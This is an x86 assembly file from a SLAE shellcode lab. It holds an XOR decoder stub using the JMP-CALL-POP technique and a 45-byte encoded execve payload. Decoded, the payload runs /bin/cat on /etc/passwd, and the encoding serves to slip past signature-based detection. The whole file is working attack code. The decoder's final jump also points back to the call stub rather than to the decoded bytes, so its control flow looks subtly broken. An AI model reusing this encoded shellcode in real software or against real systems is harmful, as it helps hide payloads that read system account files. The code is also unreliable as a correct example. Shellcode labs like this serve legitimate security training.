; Shellcode to exercise the XOR-Encoder SLAE execve lab
; Author: Pedro Rodrigues


global _start

section .text

_start:

	; JMP - CALL - POP techinique to get the EIP address
	jmp short Shellcode

Encoded:
	; getting the address and storing in ESI
	pop esi

	; Preparing the ECX register to count the quantity of Bytes
	xor ecx, ecx
	mov cl, 45

Decoder:
	; XOR the byte pointed at this moment by the address stored in ESI
	xor byte [esi], 0xAA
	
	; "Walking" through ESI by incrementing
	inc esi

	; We'll loop in the Decoder phase until the register CL reach zero thus stoping the loop
	loop Decoder

	jmp short Shellcode


Shellcode:
	
	; Calling the procedure that will store the address of the execve_shellcode
	call Encoded
	; This is the shellcode already encoded.
	execve_shellcode: db 0x9b,0x71,0x5d,0x49,0xf9,0xc2,0xd9,0xd9,0xdd,0xce,0xc2,0xc9,0x85,0xda,0xcb,0xc2,0x85,0x85,0xcf,0xde,0x23,0x4b,0xfa,0xc2,0x85,0xc9,0xcb,0xde,0xc2,0x85,0xc8,0xc3,0xc4,0x27,0xb6,0x8e,0xfa,0xfb,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a